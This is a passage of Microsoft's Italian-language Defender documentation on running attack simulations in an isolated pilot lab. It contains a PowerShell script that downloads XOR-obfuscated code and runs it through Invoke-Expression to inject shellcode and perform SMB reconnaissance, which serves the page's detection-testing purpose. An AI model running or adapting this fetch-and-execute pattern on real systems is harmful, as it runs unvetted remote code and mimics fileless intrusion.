---
title: Eseguire una simulazione di attacco in un Microsoft 365 Defender pilota, ambiente isolato per simulazione di attacco, risposta, correzione
description: Eseguire simulazioni di Microsoft 365 Defender per vedere come vengono presentati gli avvisi e gli eventi imprevisti, vengono acquisite informazioni approfondite e le minacce vengono rapidamente corretti.
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
ms.date: 07/09/2021
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: ebea0a8eeed737712c55eb80b9ce3c68e06853c1
ms.sourcegitcommit: 718759c7146062841f7eb4a0a9a8bdddce0139b0
ms.translationtype: MT
ms.contentlocale: it-IT
ms.lasthandoff: 07/15/2021
ms.locfileid: "53458148"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a><span data-ttu-id="ae96d-103">Eseguire una simulazione di attacco in un Microsoft 365 Defender pilota</span><span class="sxs-lookup"><span data-stu-id="ae96d-103">Run an attack simulation in a Microsoft 365 Defender pilot environment</span></span>


<span data-ttu-id="ae96d-104">Questo articolo è [il passaggio 1 di 2](eval-defender-investigate-respond.md) nel processo di esecuzione di un'indagine e di risposta a un evento imprevisto in Microsoft 365 Defender un ambiente pilota.</span><span class="sxs-lookup"><span data-stu-id="ae96d-104">This article is [Step 1 of 2](eval-defender-investigate-respond.md) in the process of performing an investigation and response of an incident in Microsoft 365 Defender using a pilot environment.</span></span> <span data-ttu-id="ae96d-105">Per ulteriori informazioni su questo processo, vedere [l'articolo di panoramica.](eval-defender-investigate-respond.md)</span><span class="sxs-lookup"><span data-stu-id="ae96d-105">For more information about this process, see the [overview](eval-defender-investigate-respond.md) article.</span></span>

<span data-ttu-id="ae96d-106">Dopo aver preparato l'ambiente [pilota,](eval-defender-investigate-respond.md)è il momento di testare la risposta agli incidenti di Microsoft 365 Defender e le funzionalità di analisi e correzione automatizzate creando un evento imprevisto con un attacco simulato e utilizzando il portale di Microsoft 365 Defender per analizzare e rispondere.</span><span class="sxs-lookup"><span data-stu-id="ae96d-106">After preparing your [pilot environment](eval-defender-investigate-respond.md), it's time to test Microsoft 365 Defender's incident response and automated investigation and remediation capabilities by creating an incident with a simulated attack and using the Microsoft 365 Defender portal to investigate and respond.</span></span>

<span data-ttu-id="ae96d-107">Un evento imprevisto Microsoft 365 Defender è una raccolta di avvisi correlati e dati associati che costituiscono la storia di un attacco.</span><span class="sxs-lookup"><span data-stu-id="ae96d-107">An incident in Microsoft 365 Defender is a collection of correlated alerts and associated data that make up the story of an attack.</span></span>

<span data-ttu-id="ae96d-108">Microsoft 365 e le app creano avvisi quando rilevano un evento o un'attività sospetta o dannosa.</span><span class="sxs-lookup"><span data-stu-id="ae96d-108">Microsoft 365 services and apps create alerts when they detect a suspicious or malicious event or activity.</span></span> <span data-ttu-id="ae96d-109">I singoli avvisi forniscono indicazioni preziose su un attacco completato o in corso.</span><span class="sxs-lookup"><span data-stu-id="ae96d-109">Individual alerts provide valuable clues about a completed or ongoing attack.</span></span> <span data-ttu-id="ae96d-110">Tuttavia, gli attacchi in genere utilizzano diverse tecniche per diversi tipi di entità, ad esempio dispositivi, utenti e cassette postali.</span><span class="sxs-lookup"><span data-stu-id="ae96d-110">However, attacks typically employ various techniques against different types of entities, such as devices, users, and mailboxes.</span></span> <span data-ttu-id="ae96d-111">Il risultato è più avvisi per più entità nel tenant.</span><span class="sxs-lookup"><span data-stu-id="ae96d-111">The result is multiple alerts for multiple entities in your tenant.</span></span>

>[!Note]
><span data-ttu-id="ae96d-112">Se non si ha novità nell'analisi [](first-incident-overview.md) della sicurezza e nella risposta agli incidenti, vedere la procedura dettagliata Rispondi al primo evento imprevisto per ottenere una presentazione guidata di un processo tipico di analisi, correzione e revisione post-incidente.</span><span class="sxs-lookup"><span data-stu-id="ae96d-112">If you are brand new to security analysis and incident response, see the [Respond to your first incident walkthrough](first-incident-overview.md) to get a guided tour of a typical process of analysis, remediation, and post-incident review.</span></span>
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a><span data-ttu-id="ae96d-113">Simulare gli attacchi con il Microsoft 365 Defender portale</span><span class="sxs-lookup"><span data-stu-id="ae96d-113">Simulate attacks with the Microsoft 365 Defender portal</span></span>

<span data-ttu-id="ae96d-114">Il portale Microsoft 365 Defender ha funzionalità integrate per creare attacchi simulati all'ambiente pilota:</span><span class="sxs-lookup"><span data-stu-id="ae96d-114">The Microsoft 365 Defender portal has built-in capabilities to create simulated attacks on your pilot environment:</span></span>

- <span data-ttu-id="ae96d-115">Formazione sulla simulazione di Microsoft 365 Defender per Office 365 all'indirizzo [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator) .</span><span class="sxs-lookup"><span data-stu-id="ae96d-115">Attack simulation training for Microsoft 365 Defender for Office 365 at [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator).</span></span>
  
  <span data-ttu-id="ae96d-116">Nel portale Microsoft 365 Defender, selezionare Formazione sulla simulazione di **& e > di simulazione degli attacchi** tramite posta elettronica.</span><span class="sxs-lookup"><span data-stu-id="ae96d-116">In the Microsoft 365 Defender portal, select **Email & collaboration > Attack simulation training**.</span></span>

- <span data-ttu-id="ae96d-117">Esercitazioni di attacco & simulazioni per Microsoft 365 Defender per gli endpoint all'indirizzo [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations) .</span><span class="sxs-lookup"><span data-stu-id="ae96d-117">Attack tutorials & simulations for Microsoft 365 Defender for Endpoints at [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations).</span></span>

  <span data-ttu-id="ae96d-118">Nel portale Microsoft 365 Defender, selezionare **Endpoint > esercitazioni & simulazioni**.</span><span class="sxs-lookup"><span data-stu-id="ae96d-118">In the Microsoft 365 Defender portal, select **Endpoints > Tutorials & simulations**.</span></span>

### <a name="defender-for-office-365-attack-simulation-training"></a><span data-ttu-id="ae96d-119">Formazione sulla simulazione Office 365 Defender for Office 365 Attack</span><span class="sxs-lookup"><span data-stu-id="ae96d-119">Defender for Office 365 Attack simulation training</span></span>

<span data-ttu-id="ae96d-120">Defender for Office 365 con Microsoft 365 E5 o Microsoft Defender per Office 365 Piano 2 include un training di simulazione degli attacchi per gli attacchi di phishing.</span><span class="sxs-lookup"><span data-stu-id="ae96d-120">Defender for Office 365 with Microsoft 365 E5 or Microsoft Defender for Office 365 Plan 2 includes attack simulation training for phishing attacks.</span></span> <span data-ttu-id="ae96d-121">I passaggi di base sono:</span><span class="sxs-lookup"><span data-stu-id="ae96d-121">The basic steps are:</span></span>

1. <span data-ttu-id="ae96d-122">Creare una simulazione</span><span class="sxs-lookup"><span data-stu-id="ae96d-122">Create a simulation</span></span>

   <span data-ttu-id="ae96d-123">Per istruzioni dettagliate su come creare e inviare una nuova [simulazione,](/microsoft-365/security/office-365-security/attack-simulation-training)vedere Simulate a phishing attack .</span><span class="sxs-lookup"><span data-stu-id="ae96d-123">For step by step instructions on how to create and send a new simulation, see [Simulate a phishing attack](/microsoft-365/security/office-365-security/attack-simulation-training).</span></span>

2. <span data-ttu-id="ae96d-124">Creare un payload</span><span class="sxs-lookup"><span data-stu-id="ae96d-124">Create a payload</span></span>

   <span data-ttu-id="ae96d-125">Per istruzioni dettagliate su come creare un payload da usare all'interno di una simulazione, vedi Creare un payload personalizzato per [il training della simulazione di attacco.](/microsoft-365/security/office-365-security/attack-simulation-training-payloads)</span><span class="sxs-lookup"><span data-stu-id="ae96d-125">For step by step instructions on how to create a payload for use within a simulation, see [Create a custom payload for Attack simulation training](/microsoft-365/security/office-365-security/attack-simulation-training-payloads).</span></span>

3. <span data-ttu-id="ae96d-126">Ottenere informazioni dettagliate</span><span class="sxs-lookup"><span data-stu-id="ae96d-126">Gaining insights</span></span>

   <span data-ttu-id="ae96d-127">Per istruzioni dettagliate su come ottenere informazioni dettagliate con la creazione di report, vedi Acquisire informazioni dettagliate tramite la formazione [sulla simulazione di attacchi.](/microsoft-365/security/office-365-security/attack-simulation-training-insights)</span><span class="sxs-lookup"><span data-stu-id="ae96d-127">For step by step instructions on how to gain insights with reporting, see [Gain insights through Attack simulation training](/microsoft-365/security/office-365-security/attack-simulation-training-insights).</span></span>

<span data-ttu-id="ae96d-128">Per ulteriori informazioni, vedere [Simulations.](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations)</span><span class="sxs-lookup"><span data-stu-id="ae96d-128">For more information, see [Simulations](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations).</span></span>

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a><span data-ttu-id="ae96d-129">Esercitazioni sull'attacco di Defender per endpoint & simulazioni</span><span class="sxs-lookup"><span data-stu-id="ae96d-129">Defender for Endpoint attack tutorials & simulations</span></span>

<span data-ttu-id="ae96d-130">Ecco le simulazioni di Defender for Endpoint di Microsoft:</span><span class="sxs-lookup"><span data-stu-id="ae96d-130">Here are the Defender for Endpoint simulations from Microsoft:</span></span>

- <span data-ttu-id="ae96d-131">Backdoor dei documenti</span><span class="sxs-lookup"><span data-stu-id="ae96d-131">Document drops backdoor</span></span>
- <span data-ttu-id="ae96d-132">Indagine automatizzata (backdoor)</span><span class="sxs-lookup"><span data-stu-id="ae96d-132">Automated investigation (backdoor)</span></span>

<span data-ttu-id="ae96d-133">Sono disponibili simulazioni aggiuntive da IQ di attacco e SafeBreach.</span><span class="sxs-lookup"><span data-stu-id="ae96d-133">There are additional simulations from Attack IQ and SafeBreach.</span></span> <span data-ttu-id="ae96d-134">Sono disponibili anche una serie di esercitazioni.</span><span class="sxs-lookup"><span data-stu-id="ae96d-134">There are also a set of tutorials.</span></span>

<span data-ttu-id="ae96d-135">Per ogni simulazione o esercitazione:</span><span class="sxs-lookup"><span data-stu-id="ae96d-135">For each simulation or tutorial:</span></span>

1. <span data-ttu-id="ae96d-136">Scaricare e leggere il documento di analisi corrispondente fornito con la simulazione o lo scenario selezionato.</span><span class="sxs-lookup"><span data-stu-id="ae96d-136">Download and read the corresponding walk through document provided with your selected simulation or scenario.</span></span>

2. <span data-ttu-id="ae96d-137">Scarica il file di simulazione.</span><span class="sxs-lookup"><span data-stu-id="ae96d-137">Download the simulation file.</span></span> <span data-ttu-id="ae96d-138">Puoi scegliere di scaricare il file o lo script nel dispositivo di test, ma non è obbligatorio.</span><span class="sxs-lookup"><span data-stu-id="ae96d-138">You can choose to download the file or script on the test device but it's not mandatory.</span></span>

3. <span data-ttu-id="ae96d-139">Eseguire il file o lo script di simulazione nel dispositivo di test come indicato nel documento di analisi.</span><span class="sxs-lookup"><span data-stu-id="ae96d-139">Run the simulation file or script on the test device as instructed in the walk through document.</span></span>

 <span data-ttu-id="ae96d-140">Per altre informazioni, vedi [Esperienza di Microsoft Defender per Endpoint tramite attacco simulato.](/microsoft-365/security/defender-endpoint/attack-simulations)</span><span class="sxs-lookup"><span data-stu-id="ae96d-140">For more information, see [Experience Microsoft Defender for Endpoint through simulated attack](/microsoft-365/security/defender-endpoint/attack-simulations).</span></span>

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a><span data-ttu-id="ae96d-141">Simulare un attacco con un controller di dominio isolato e un dispositivo client (facoltativo)</span><span class="sxs-lookup"><span data-stu-id="ae96d-141">Simulate an attack with an isolated domain controller and client device (optional)</span></span>

<span data-ttu-id="ae96d-142">In questo esercizio facoltativo di risposta agli eventi imprevisti, si simula un attacco a un controller di dominio di Servizi di dominio Active Directory isolato e a un dispositivo Windows 10 utilizzando uno script di PowerShell e quindi si analizza, si corregge e si risolve l'evento imprevisto.</span><span class="sxs-lookup"><span data-stu-id="ae96d-142">In this optional incident response exercise, you'll simulate an attack on an isolated Active Directory Domain Services (AD DS) domain controller and Windows 10 device using a PowerShell script and then investigate, remediate, and resolve the incident.</span></span>

<span data-ttu-id="ae96d-143">Innanzitutto, è necessario aggiungere endpoint all'ambiente pilota.</span><span class="sxs-lookup"><span data-stu-id="ae96d-143">First, you need to add endpoints to your pilot environment.</span></span>

### <a name="add-pilot-environment-endpoints"></a><span data-ttu-id="ae96d-144">Aggiungere endpoint dell'ambiente pilota</span><span class="sxs-lookup"><span data-stu-id="ae96d-144">Add pilot environment endpoints</span></span>

<span data-ttu-id="ae96d-145">Prima di tutto, è necessario aggiungere un controller di dominio di Servizi di dominio Active Directory isolato e Windows 10 dispositivo all'ambiente pilota.</span><span class="sxs-lookup"><span data-stu-id="ae96d-145">First, you need to add an isolated AD DS domain controller and a Windows 10 device to your pilot environment.</span></span>

1. <span data-ttu-id="ae96d-146">Verificare che il tenant dell'ambiente [pilota abbia abilitato Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).</span><span class="sxs-lookup"><span data-stu-id="ae96d-146">Verify your pilot environment tenant has [enabled Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).</span></span>

2. <span data-ttu-id="ae96d-147">Verificare che il controller di dominio:</span><span class="sxs-lookup"><span data-stu-id="ae96d-147">Verify that your domain controller:</span></span>

   - <span data-ttu-id="ae96d-148">Esegue Windows Server 2008 R2 o versione successiva.</span><span class="sxs-lookup"><span data-stu-id="ae96d-148">Runs Windows Server 2008 R2 or a later version.</span></span>
   - <span data-ttu-id="ae96d-149">Segnala a [Microsoft Defender per l'identità e](/azure/security-center/security-center-wdatp) ha abilitato la gestione [remota.](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)</span><span class="sxs-lookup"><span data-stu-id="ae96d-149">Reports to [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) and has enabled [remote management](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>
   - <span data-ttu-id="ae96d-150">Microsoft [Defender per l'identità e l'Microsoft Cloud App Security è](/cloud-app-security/mdi-integration) abilitata.</span><span class="sxs-lookup"><span data-stu-id="ae96d-150">Has [Microsoft Defender for Identity and Microsoft Cloud App Security integration](/cloud-app-security/mdi-integration) enabled.</span></span>
   - <span data-ttu-id="ae96d-151">Viene creato un utente di test nel dominio di test.</span><span class="sxs-lookup"><span data-stu-id="ae96d-151">Has a test user is created in the test domain.</span></span> <span data-ttu-id="ae96d-152">Le autorizzazioni a livello di amministratore non sono necessarie.</span><span class="sxs-lookup"><span data-stu-id="ae96d-152">Administrator-level permissions are not needed.</span></span>

3. <span data-ttu-id="ae96d-153">Verificare che il dispositivo di test:</span><span class="sxs-lookup"><span data-stu-id="ae96d-153">Verify that your test device:</span></span>

   - <span data-ttu-id="ae96d-154">Viene Windows 10 versione 1903 o successiva.</span><span class="sxs-lookup"><span data-stu-id="ae96d-154">Runs Windows 10 version 1903 or a later version.</span></span>
   - <span data-ttu-id="ae96d-155">Fa parte del dominio del controller di dominio di Servizi di dominio Active Directory.</span><span class="sxs-lookup"><span data-stu-id="ae96d-155">Is joined to the AD DS domain controller domain.</span></span>
   - <span data-ttu-id="ae96d-156">Ha [Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) abilitato.</span><span class="sxs-lookup"><span data-stu-id="ae96d-156">Has [Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) enabled.</span></span> <span data-ttu-id="ae96d-157">In caso di problemi durante l'abilitazione Windows Defender Antivirus, vedere questo [argomento per la risoluzione dei problemi.](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)</span><span class="sxs-lookup"><span data-stu-id="ae96d-157">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
   - <span data-ttu-id="ae96d-158">Viene [onboarded in Microsoft Defender for Endpoint.](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)</span><span class="sxs-lookup"><span data-stu-id="ae96d-158">Is [onboarded to Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="ae96d-159">Se usi i gruppi di tenant e dispositivi, crea un gruppo di dispositivi dedicato per il dispositivo di test e spingilo al livello superiore.</span><span class="sxs-lookup"><span data-stu-id="ae96d-159">If you use tenant and device groups, create a dedicated device group for the test device and push it to top level.</span></span>

<span data-ttu-id="ae96d-160">Un'alternativa consiste nell'ospitare il controller di dominio e il dispositivo di test di Servizi di dominio Active Directory come macchine virtuali nei Microsoft Azure di infrastruttura.</span><span class="sxs-lookup"><span data-stu-id="ae96d-160">One alternative is to host your AD DS domain controller and test device as virtual machines in Microsoft Azure infrastructure services.</span></span> <span data-ttu-id="ae96d-161">Puoi usare le istruzioni nella [fase 1](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet)della guida al laboratorio di testing aziendale simulata, ma ignora la creazione della macchina virtuale APP1.</span><span class="sxs-lookup"><span data-stu-id="ae96d-161">You can use the instructions in [Phase 1 of the simulated enterprise Test Lab Guide](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet), but skip the creation of the APP1 virtual machine.</span></span>

<span data-ttu-id="ae96d-162">Ecco il risultato.</span><span class="sxs-lookup"><span data-stu-id="ae96d-162">Here is the result.</span></span>

![Endpoint per l'ambiente di valutazione di Defender usando la guida al laboratorio di testing aziendale simulata](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png)

<span data-ttu-id="ae96d-164">Si simula un attacco sofisticato che sfrutta tecniche avanzate per nascondersi dal rilevamento.</span><span class="sxs-lookup"><span data-stu-id="ae96d-164">You'll simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="ae96d-165">L'attacco enumera le sessioni SMB (Server Message Block) aperte nei controller di dominio e recupera gli indirizzi IP recenti dei dispositivi degli utenti.</span><span class="sxs-lookup"><span data-stu-id="ae96d-165">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users' devices.</span></span> <span data-ttu-id="ae96d-166">Questa categoria di attacchi in genere non include i file rilasciati nel dispositivo della vittima e si verificano esclusivamente in memoria.</span><span class="sxs-lookup"><span data-stu-id="ae96d-166">This category of attacks usually doesn't include files dropped on the victim's device and they occur solely in memory.</span></span> <span data-ttu-id="ae96d-167">Usano strumenti di amministrazione e di sistema esistenti e inserisce il codice nei processi di sistema per nasconderne l'esecuzione.</span><span class="sxs-lookup"><span data-stu-id="ae96d-167">They "live off the land" by using existing system and administrative tools and inject their code into system processes to hide their execution.</span></span> <span data-ttu-id="ae96d-168">Questo comportamento consente loro di evitare il rilevamento e di persistere nel dispositivo.</span><span class="sxs-lookup"><span data-stu-id="ae96d-168">Such behavior allows them to evade detection and persist on the device.</span></span>

<span data-ttu-id="ae96d-169">In questa simulazione, lo scenario di esempio inizia con uno script di PowerShell.</span><span class="sxs-lookup"><span data-stu-id="ae96d-169">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="ae96d-170">Nel mondo reale, un utente potrebbe essere ingannato nell'esecuzione di uno script o lo script potrebbe essere eseguito da una connessione remota a un altro computer da un dispositivo in precedenza infetto, il che indica che l'utente malintenzionato sta tentando di spostarsi lateralmente nella rete.</span><span class="sxs-lookup"><span data-stu-id="ae96d-170">In the real world, a user might be tricked into running a script or the script might run from a remote connection to another computer from a previously infected device, which indicates that the attacker is attempting to move laterally in the network.</span></span> <span data-ttu-id="ae96d-171">Il rilevamento di questi script può essere difficile perché gli amministratori spesso eseguono anche script in remoto per eseguire diverse attività amministrative.</span><span class="sxs-lookup"><span data-stu-id="ae96d-171">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![Attacco PowerShell senza file con inserimento del processo e diagramma di attacco di ricognizione SMB](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="ae96d-173">Durante la simulazione, l'attacco inserisce shellcode in un processo apparentemente innocenza.</span><span class="sxs-lookup"><span data-stu-id="ae96d-173">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="ae96d-174">Lo scenario richiede l'uso di notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="ae96d-174">The scenario requires the use of notepad.exe.</span></span> <span data-ttu-id="ae96d-175">Abbiamo scelto questo processo per la simulazione, ma è più probabile che gli utenti malintenzionati si ritorsino a un processo di sistema a esecuzione lunga, ad esempio svchost.exe.</span><span class="sxs-lookup"><span data-stu-id="ae96d-175">We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="ae96d-176">Il codice shell passa quindi a contattare il server di comando e controllo (C2) dell'utente malintenzionato per ricevere istruzioni su come procedere.</span><span class="sxs-lookup"><span data-stu-id="ae96d-176">The shellcode then goes on to contact the attacker's command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="ae96d-177">Lo script tenta di eseguire query di ricognizione sul controller di dominio .</span><span class="sxs-lookup"><span data-stu-id="ae96d-177">The script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="ae96d-178">La ricognizione consente a un utente malintenzionato di ottenere informazioni sulle informazioni di accesso degli utenti recenti.</span><span class="sxs-lookup"><span data-stu-id="ae96d-178">Reconnaissance allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="ae96d-179">Una volta che gli utenti malintenzionati hanno queste informazioni, possono spostarsi lateralmente nella rete per accedere a un account sensibile specifico</span><span class="sxs-lookup"><span data-stu-id="ae96d-179">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

> [!IMPORTANT]
> <span data-ttu-id="ae96d-180">Per ottenere risultati ottimali, seguire le istruzioni di simulazione degli attacchi il più attentamente possibile.</span><span class="sxs-lookup"><span data-stu-id="ae96d-180">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a><span data-ttu-id="ae96d-181">Eseguire la simulazione di attacco del controller di dominio di Servizi di dominio Active Directory isolato</span><span class="sxs-lookup"><span data-stu-id="ae96d-181">Run the isolated AD DS domain controller attack simulation</span></span>

<span data-ttu-id="ae96d-182">Per eseguire la simulazione dello scenario di attacco:</span><span class="sxs-lookup"><span data-stu-id="ae96d-182">To run the attack scenario simulation:</span></span>

1. <span data-ttu-id="ae96d-183">Verificare che l'ambiente pilota includa il controller di dominio di Servizi di dominio Active Directory isolato e Windows 10 dispositivo.</span><span class="sxs-lookup"><span data-stu-id="ae96d-183">Ensure that your pilot environment includes the isolated AD DS domain controller and Windows 10 device.</span></span>

2. <span data-ttu-id="ae96d-184">Accedi al dispositivo di test con l'account utente di test.</span><span class="sxs-lookup"><span data-stu-id="ae96d-184">Sign in to the test device with the test user account.</span></span>

3. <span data-ttu-id="ae96d-185">Apri una Windows PowerShell nel dispositivo di test.</span><span class="sxs-lookup"><span data-stu-id="ae96d-185">Open a Windows PowerShell window on the test device.</span></span>

4. <span data-ttu-id="ae96d-186">Copiare lo script di simulazione seguente:</span><span class="sxs-lookup"><span data-stu-id="ae96d-186">Copy the following simulation script:</span></span>

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > <span data-ttu-id="ae96d-187">Se si apre questo articolo in un Web browser, è possibile che si verifichino problemi durante la copia del testo completo senza perdere determinati caratteri o introducendo interruzioni di riga aggiuntive.</span><span class="sxs-lookup"><span data-stu-id="ae96d-187">If you open this article on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="ae96d-188">In questo caso, scarica questo documento e aprilo in Adobe Reader.</span><span class="sxs-lookup"><span data-stu-id="ae96d-188">If this is the case, download this document and open it on Adobe Reader.</span></span>

5. <span data-ttu-id="ae96d-189">Incollare ed eseguire lo script copiato nella finestra di PowerShell.</span><span class="sxs-lookup"><span data-stu-id="ae96d-189">Paste and run the copied script in the PowerShell window.</span></span>

> [!NOTE]
> <span data-ttu-id="ae96d-190">Se si esegue PowerShell con RDP (Remote Desktop Protocol), utilizzare il comando Digita testo Appunti nel client RDP perché il tasto di scelta rapida **CTRL-V** o il metodo di incolla con il pulsante destro del mouse potrebbe non funzionare.</span><span class="sxs-lookup"><span data-stu-id="ae96d-190">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span> <span data-ttu-id="ae96d-191">Anche le versioni recenti di PowerShell a volte non accettano questo metodo, potrebbe essere necessario prima copiarlo in Blocco note in memoria, copiarlo nella macchina virtuale e quindi incollarlo in PowerShell.</span><span class="sxs-lookup"><span data-stu-id="ae96d-191">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="ae96d-192">Pochi secondi dopo, l'app Blocco note si aprirà.</span><span class="sxs-lookup"><span data-stu-id="ae96d-192">A few seconds later, the Notepad app will open.</span></span> <span data-ttu-id="ae96d-193">Un codice di attacco simulato verrà inserito in Blocco note.</span><span class="sxs-lookup"><span data-stu-id="ae96d-193">A simulated attack code will be injected into Notepad.</span></span> <span data-ttu-id="ae96d-194">Mantenere aperta l'Blocco note generata automaticamente per sperimentare lo scenario completo.</span><span class="sxs-lookup"><span data-stu-id="ae96d-194">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="ae96d-195">Il codice di attacco simulato tenterà di comunicare con un indirizzo IP esterno (simulando il server C2) e quindi tenterà la ricognizione con il controller di dominio tramite SMB.</span><span class="sxs-lookup"><span data-stu-id="ae96d-195">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="ae96d-196">Questo messaggio verrà visualizzato nella console di PowerShell al termine dello script:</span><span class="sxs-lookup"><span data-stu-id="ae96d-196">You'll see this message displayed on the PowerShell console when this script completes:</span></span>

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

<span data-ttu-id="ae96d-197">Per visualizzare la funzionalità Eventi imprevisti e risposte automatizzati in azione, mantenere aperto notepad.exe processo.</span><span class="sxs-lookup"><span data-stu-id="ae96d-197">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="ae96d-198">Vedrai l'arresto automatico degli eventi imprevisti e della risposta Blocco note processo.</span><span class="sxs-lookup"><span data-stu-id="ae96d-198">You'll see Automated Incident and Response stop the Notepad process.</span></span>

### <a name="investigate-the-incident-for-the-simulated-attack"></a><span data-ttu-id="ae96d-199">Analizzare l'evento imprevisto per l'attacco simulato</span><span class="sxs-lookup"><span data-stu-id="ae96d-199">Investigate the incident for the simulated attack</span></span>

> [!NOTE]
> <span data-ttu-id="ae96d-200">Prima di illustrare questa simulazione, guardare il video seguente per vedere come la gestione degli eventi imprevisti consente di riunire gli avvisi correlati nell'ambito del processo di indagine, dove è possibile trovarlo nel portale e come può essere utile nelle operazioni di sicurezza:</span><span class="sxs-lookup"><span data-stu-id="ae96d-200">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="ae96d-201">Passando al punto di vista dell'analista SOC, è ora possibile iniziare a analizzare l'attacco nel Microsoft 365 Defender portale.</span><span class="sxs-lookup"><span data-stu-id="ae96d-201">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Defender portal.</span></span>

1. <span data-ttu-id="ae96d-202">Aprire il [Microsoft 365 Defender portale.](https://security.microsoft.com/)</span><span class="sxs-lookup"><span data-stu-id="ae96d-202">Open the [Microsoft 365 Defender portal](https://security.microsoft.com/).</span></span>

2. <span data-ttu-id="ae96d-203">Nel riquadro di spostamento selezionare **Eventi imprevisti & avvisi > eventi imprevisti**.</span><span class="sxs-lookup"><span data-stu-id="ae96d-203">From the navigation pane, select **Incidents & Alerts > Incidents**.</span></span>

3. <span data-ttu-id="ae96d-204">Il nuovo evento imprevisto per l'attacco simulato verrà visualizzato nella coda degli eventi imprevisti.</span><span class="sxs-lookup"><span data-stu-id="ae96d-204">The new incident for the simulated attack will appear in the incident queue.</span></span>

    ![Esempio di coda degli eventi imprevisti](../../media/mtp/fig2.png)

#### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="ae96d-206">Analizzare l'attacco come un singolo evento imprevisto</span><span class="sxs-lookup"><span data-stu-id="ae96d-206">Investigate the attack as a single incident</span></span>

